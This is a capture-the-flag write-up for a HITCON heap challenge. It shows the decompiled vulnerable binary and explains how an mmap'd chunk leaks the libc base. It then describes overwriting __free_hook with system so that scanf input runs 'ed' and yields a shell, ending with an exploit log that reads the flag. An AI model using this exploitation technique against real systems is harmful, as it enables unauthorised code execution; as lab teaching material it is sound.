The binary is very simple. It can malloc arbitrary size of chunk and leak heap address. Besides, user can overwrite memory twice:

```c
int main() {
    // ...
    __isoc99_scanf("%lu", &size);
    v7 = malloc(size);
    if ( v7 ) {
        printf("Magic:%p\n", v7);
        for ( i = 0; i <= 1; ++i ) {
            write(1, "Offset & Value:", 0x10uLL);
            __isoc99_scanf("%lx %lx", &v5, &v6);
            v7[v5] = v6; // QWORD!
        }
    }
    _exit(0);
}
```

Glibc may use mmap to allocate heap memory if the request chunk size is sufficient large enough. For example, if user request to allocate 16M heap memory, the proc map may look like this:

```
gdb-peda$ vmmap
Start              End                Perm      Name
0x0000558dc78ea000 0x0000558dc78ec000 r-xp      /ctf/asterisk_alloc
0x0000558dc7aeb000 0x0000558dc7aec000 r--p      /ctf/asterisk_alloc
0x0000558dc7aec000 0x0000558dc7aed000 rw-p      /ctf/asterisk_alloc
0x0000558dc8dbd000 0x0000558dc8dde000 rw-p      [heap]
0x00007f07f3621000 0x00007f07f3808000 r-xp      /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f07f3808000 0x00007f07f3a08000 ---p      /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f07f3a08000 0x00007f07f3a0c000 r--p      /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f07f3a0c000 0x00007f07f3a0e000 rw-p      /lib/x86_64-linux-gnu/libc-2.27.so
...
```

Libc base address is leaked because heap memory is just below the libc base: `libc_base = heap_addr + request_size + 0x1000 - 0x10`.

Also, `scanf("%lx %lx")` filters out non-hex character from input. After realizing none of one gadgets are useful for `__malloc_hook` or `__free_hook`, overwriting `system` to `__free_hook` seems to be a promising idea as scanf only frees scratch buffer at the end. As a result, input `'c'*0x400 + ' ed'` triggers `system('ed')` and lead to flag (thanks to b2xiao and jarsp):

```
[+] Opening connection to 3.112.41.140 on port 56746: Done
[*] heap_addr = 0x7fb3a11da010
[*] libc_addr = 0x7fb3a21db000
[*] free_hook = 0x7fb3a25c88e8
[*] Switching to interactive mode
$ !/bin/sh
$ whoami
trick_or_treat
$ cat /home/trick_or_treat/flag
hitcon{T1is_i5_th3_c4ndy_for_yoU}
[*] Got EOF while reading in interactive
```
